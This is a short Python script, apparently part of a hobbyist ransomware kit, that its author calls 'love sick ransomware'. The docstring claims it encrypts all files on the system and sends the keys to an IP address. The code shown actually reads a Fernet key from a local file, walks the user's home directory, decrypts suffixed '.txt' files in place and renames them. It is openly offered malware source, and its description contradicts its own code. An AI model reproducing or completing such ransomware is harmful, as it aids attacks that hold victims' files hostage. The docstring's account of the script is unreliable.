import os
from os.path import expanduser
from cryptography.fernet import Fernet
class ransomware(object):
    """
    I named this love sick ransomware
    this will encrypt all files in your system
    and send keys to specific ip address
    """
    def __init__(self):
            with open("keyfile",'rb') as f:
                self.key = f.read()
            self.cryptor = Fernet(self.key)
    
    def decrypt(self,data):
        return self.cryptor.decrypt(data)

    def path_traversal(self,path):
        for root, _, files in os.walk(path):
            for name in files:
                yield(os.path.join(root,name))

    def fileextcheck(self,path):
        for file in self.path_traversal(path):
            if not file[:-9].endswith("txt"):
                continue
            with open(file,"rb+") as f:
                data = f.read()
                f.seek(0)
                f.truncate()
                f.write(self.decrypt(data))
            os.rename(file,file[:-9])

if __name__ == "__main__":
    rware = ransomware()
    rware.fileextcheck(expanduser('~'))